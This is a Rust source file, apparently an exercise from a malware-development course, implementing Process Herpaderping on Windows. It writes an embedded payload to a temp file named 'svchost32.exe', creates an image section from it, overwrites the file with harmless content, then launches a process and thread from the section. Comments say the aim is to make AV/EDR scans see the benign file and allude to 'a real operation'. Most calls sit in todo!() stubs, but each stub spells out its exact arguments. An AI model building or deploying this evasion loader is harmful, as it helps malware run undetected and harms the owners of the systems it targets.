use std::ffi::c_void;
use std::mem;
use windows::Win32::Foundation::{CloseHandle, GENERIC_READ, GENERIC_WRITE, HANDLE};
use windows::Win32::Storage::FileSystem::{
    CreateFileA, WriteFile, SetFilePointer, SetEndOfFile,
    FILE_SHARE_READ, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
    FILE_BEGIN,
};
use windows::Win32::System::Threading::{
    GetCurrentProcess, ResumeThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
};
use windows::Win32::System::Memory::{PAGE_READONLY, SEC_IMAGE};
use windows::core::PCSTR;
use ntapi::ntmmapi::NtCreateSection;
use ntapi::ntpsapi::{NtCreateProcessEx, NtCreateThreadEx};

// Build 04-hollow-payload first, then this crate:
//   cargo build --target x86_64-pc-windows-gnu -p hollow-payload
//   cargo build --target x86_64-pc-windows-gnu -p process-doppelganging
const PAYLOAD: &[u8] = include_bytes!(
    "../../target/x86_64-pc-windows-gnu/debug/hollow_payload.exe"
);

// A minimal "benign" file written over the payload on disk after the section is created.
// In a real operation this would be a legitimate signed binary.
const BENIGN: &[u8] = b"MZ\x00\x00This file is intentionally blank.\n";

fn main() {
    unsafe {
        herpaderping();
    }
}

unsafe fn herpaderping() {
    // ── Step 1 — Write the payload to a temp file ─────────────────────────────
    //
    // We need a real file on disk because NtCreateSection with SEC_IMAGE requires
    // a file-backed section. We use CREATE_ALWAYS so we overwrite any leftover file.
    //
    // CreateFileA(
    //     lpfilename: PCSTR,                      // path, e.g. "C:\\Windows\\Temp\\svchost32.exe\0"
    //     dwdesiredaccess: FILE_ACCESS_RIGHTS,    // GENERIC_READ | GENERIC_WRITE — need both
    //     dwsharemode: FILE_SHARE_MODE,           // FILE_SHARE_READ — allow readers while we write
    //     lpsecurityattributes: Option<*const SECURITY_ATTRIBUTES>, // None — default security
    //     dwcreationdisposition: FILE_CREATION_DISPOSITION, // CREATE_ALWAYS — create or truncate
    //     dwflagsandattributes: FILE_FLAGS_AND_ATTRIBUTES,  // FILE_ATTRIBUTE_NORMAL
    //     htemplatefile: Option<HANDLE>,          // None — no template
    // ) -> Result<HANDLE>                         // Err if path is inaccessible
    let temp_path = b"C:\\Windows\\Temp\\svchost32.exe\0";
    let h_file: HANDLE = todo!("CreateFileA(temp_path, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ, None, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, None).expect(\"CreateFileA failed\")");

    // ── Step 2 — Write the payload bytes into the file ────────────────────────
    //
    // WriteFile(
    //     hfile: HANDLE,                     // file handle from Step 1
    //     lpbuffer: *const c_void,           // PAYLOAD.as_ptr() cast to *const c_void
    //     nnumberofbytestowrite: u32,        // PAYLOAD.len() as u32
    //     lpnumberofbyteswritten: Option<*mut u32>, // None or Some(&mut written)
    //     lpoverlapped: Option<*mut OVERLAPPED>,    // None — synchronous write
    // ) -> Result<()>
    todo!("WriteFile(h_file, PAYLOAD.as_ptr() as _, PAYLOAD.len() as u32, None, None)");

    // ── Step 3 — Create an image section from the file ────────────────────────
    //
    // NtCreateSection maps the file as a PE image directly into kernel memory.
    // This section exists independently of the file once created — even if we
    // overwrite or delete the file, the section (and any process using it) survives.
    //
    // NtCreateSection(
    //     SectionHandle: *mut HANDLE,              // out: handle to the new section
    //     DesiredAccess: u32,                      // SECTION_ALL_ACCESS (0x10000007)
    //     ObjectAttributes: *mut OBJECT_ATTRIBUTES, // NULL — no special attributes
    //     MaximumSize: *mut LARGE_INTEGER,         // NULL — use the file's size
    //     SectionPageProtection: u32,              // PAGE_READONLY (2)
    //     AllocationAttributes: u32,               // SEC_IMAGE (0x1000000) — maps as PE image
    //     FileHandle: HANDLE,                      // h_file — the payload file
    // ) -> i32 (NTSTATUS)                          // 0 = STATUS_SUCCESS
    //
    // SEC_IMAGE tells the kernel to validate the PE headers and honour the section
    // alignment and permissions from the PE optional header. Without it you'd just
    // get a flat file mapping.
    let mut h_section: HANDLE = HANDLE::default();
    let status = todo!("NtCreateSection(&mut h_section, SECTION_ALL_ACCESS, null_mut(), null_mut(), PAGE_READONLY.0, SEC_IMAGE.0, h_file)");
    assert_eq!(status, 0, "NtCreateSection failed: {:#x}", status);

    // ── Step 4 — Immediately overwrite the file on disk with benign content ───
    //
    // This is the core of Herpaderping: the section is already backed by the kernel;
    // the file on disk can now be replaced. AV/EDR that scan the file at open/close
    // will see the benign content, not the payload.
    //
    // Reset file pointer to the beginning:
    // SetFilePointer(
    //     hfile: HANDLE,              // h_file
    //     ldistancetomove: i32,       // 0 — move to start
    //     lpdistancetomovehigh: Option<*mut i32>, // None — distance fits in 32 bits
    //     dwmovemethod: SET_FILE_POINTER_MOVE_METHOD, // FILE_BEGIN (0) — absolute offset
    // ) -> u32                        // 0xFFFFFFFF on error
    todo!("SetFilePointer(h_file, 0, None, FILE_BEGIN) — returns INVALID_SET_FILE_POINTER (0xFFFFFFFF) on error");

    // Truncate file to zero:
    // SetEndOfFile(hfile: HANDLE) -> Result<()>
    todo!("SetEndOfFile(h_file)");

    // Write the benign content:
    todo!("WriteFile(h_file, BENIGN.as_ptr() as _, BENIGN.len() as u32, None, None)");

    // ── Step 5 — Create a process from the section ───────────────────────────
    //
    // NtCreateProcessEx creates a process from an image section rather than a file path.
    // This is the NT-level call that CreateProcess ultimately calls internally.
    //
    // NtCreateProcessEx(
    //     ProcessHandle: *mut HANDLE,    // out: handle to the new process
    //     DesiredAccess: u32,            // PROCESS_ALL_ACCESS (0x1FFFFF)
    //     ObjectAttributes: *mut OBJECT_ATTRIBUTES, // NULL
    //     ParentProcess: HANDLE,         // GetCurrentProcess() — inherit our handles/environment
    //     Flags: u32,                    // 0 — no special flags
    //     SectionHandle: HANDLE,         // h_section — the image section we created in Step 3
    //     DebugPort: HANDLE,             // NULL — no debugger
    //     ExceptionPort: HANDLE,         // NULL
    //     InJob: u32,                    // 0
    // ) -> i32 (NTSTATUS)               // 0 = STATUS_SUCCESS
    //
    // The process is created but has NO thread yet — it cannot run until you create one.
    let mut h_process: HANDLE = HANDLE::default();
    let status = todo!("NtCreateProcessEx(&mut h_process, PROCESS_ALL_ACCESS.0, null_mut(), GetCurrentProcess(), 0, h_section, HANDLE::default(), HANDLE::default(), 0)");
    assert_eq!(status, 0, "NtCreateProcessEx failed: {:#x}", status);

    // ── Step 6 — Find the entry point and set up the process environment ─────
    //
    // A process created with NtCreateProcessEx has no PEB or stack set up beyond the
    // bare minimum. You need to:
    //   a) parse PAYLOAD to find AddressOfEntryPoint
    //   b) determine where the image was mapped (query PEB or use the preferred ImageBase)
    //   c) calculate: entry_point = image_base + entry_rva
    //
    // This mirrors the PE parsing from Module 04, steps 5 and 11.
    //
    // Hint: the process was created from h_section which was created from PAYLOAD.
    //       If the OS honoured the preferred ImageBase, entry = preferred_base + entry_rva.
    //       If not, query NtQueryInformationProcess (ProcessBasicInformation) to get PebBaseAddress,
    //       then ReadProcessMemory at peb + 0x10 to get the actual ImageBase.
    let dos = PAYLOAD.as_ptr() as *const windows::Win32::System::Diagnostics::Debug::IMAGE_DOS_HEADER;
    let nt  = PAYLOAD.as_ptr().add((*dos).e_lfanew as usize)
        as *const windows::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
    let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
    let entry_rva      = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
    let entry_point    = (preferred_base + entry_rva) as *mut c_void;
    // NOTE: if the OS doesn't map at preferred_base, entry_point will be wrong.
    // For the exercise, assume the preferred base is honoured (common in practice for .NET-free PEs).

    // ── Step 7 — Create the initial thread ───────────────────────────────────
    //
    // NtCreateThreadEx(
    //     ThreadHandle: *mut HANDLE,      // out: handle to the new thread
    //     DesiredAccess: u32,             // THREAD_ALL_ACCESS (0x1FFFFF)
    //     ObjectAttributes: *mut OBJECT_ATTRIBUTES, // NULL
    //     ProcessHandle: HANDLE,          // h_process
    //     StartRoutine: *mut c_void,      // entry point address in the remote process
    //     Argument: *mut c_void,          // NULL — no argument
    //     CreateFlags: u32,               // 0x1 = THREAD_CREATE_FLAGS_CREATE_SUSPENDED
    //     ZeroBits: usize,                // 0
    //     StackSize: usize,               // 0 — use default
    //     MaximumStackSize: usize,        // 0 — use default
    //     AttributeList: *mut c_void,     // NULL
    // ) -> i32 (NTSTATUS)                 // 0 = STATUS_SUCCESS
    //
    // Create it suspended (flag 0x1) so you can inspect before running.
    let mut h_thread: HANDLE = HANDLE::default();
    let status = todo!("NtCreateThreadEx(&mut h_thread, THREAD_ALL_ACCESS, null_mut(), h_process, entry_point, null_mut(), 0x1, 0, 0, 0, null_mut())");
    assert_eq!(status, 0, "NtCreateThreadEx failed: {:#x}", status);

    // ── Step 8 — Resume the thread ────────────────────────────────────────────
    //
    // ResumeThread(hthread: HANDLE) -> u32
    //   Returns the previous suspend count. 0xFFFFFFFF = error.
    let prev = todo!("ResumeThread(h_thread)");
    assert_ne!(prev, u32::MAX, "ResumeThread failed");

    println!("[+] Herpaderping complete. Process running from in-memory section.");
    println!("[+] File on disk has been overwritten with benign content.");
    println!("[+] Open Process Hacker and inspect the process image path — it points to the overwritten file.");

    // Cleanup
    CloseHandle(h_thread).ok();
    CloseHandle(h_process).ok();
    CloseHandle(h_section).ok();
    CloseHandle(h_file).ok();
}
